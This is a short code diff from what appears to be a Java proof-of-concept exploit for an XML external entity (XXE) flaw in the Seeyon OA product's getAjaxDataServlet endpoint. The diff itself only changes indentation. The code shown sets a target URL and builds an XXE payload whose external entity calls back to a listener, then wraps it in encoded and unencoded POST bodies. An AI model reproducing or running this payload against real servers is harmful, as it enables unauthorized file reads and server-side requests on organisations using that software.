@@ -41,7 +41,7 @@ public class XXE_20230810 {
         String url3 = "http://10.58.120.201/seeyon/getAjaxDataServlet?S=ajaxEdocSummaryManager&M=deleteUpdateObj";
 
 
-        String imgvalue = "ABCDEFGHIJKLMNOPQRSTUVWXYzabcdefghijklmnopqrstuvwxyZ0123456789+/=";
+         String imgvalue = "ABCDEFGHIJKLMNOPQRSTUVWXYzabcdefghijklmnopqrstuvwxyZ0123456789+/=";
         String xmlValue = "<!DOCTYPE ANY [<!ENTITY name SYSTEM \"http://127.0.0.1:9999/success_xxe\" >]><name>&name;</name>";
         String body = "encode=true" + "&imgvalue=" + encode(imgvalue) + "&xmlValue=" + encode(xmlValue);//payload编码版
         String body2 = "imgvalue=" + imgvalue + "&xmlValue=" + URLEncoder.encode(xmlValue);//payload不编码版
